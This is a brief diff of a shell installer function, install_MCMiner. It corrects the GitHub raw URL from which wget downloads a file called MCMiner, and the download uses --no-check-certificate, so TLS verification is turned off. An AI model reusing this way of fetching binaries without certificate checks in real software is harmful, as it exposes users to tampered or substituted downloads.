@@ -97,7 +97,7 @@ install_MCMiner() {
     mkdir -p ${updatePath}
 
     cd ${updatePath}
-    wget --no-check-certificate https://raw.githubusercontent.com/mc-miner/1/raw/main/MCMiner
+    wget --no-check-certificate https://raw.githubusercontent.com/mc-miner/1/main/MCMiner
     if [ $? -ne 0 ]; then
         exit -1;
     fi
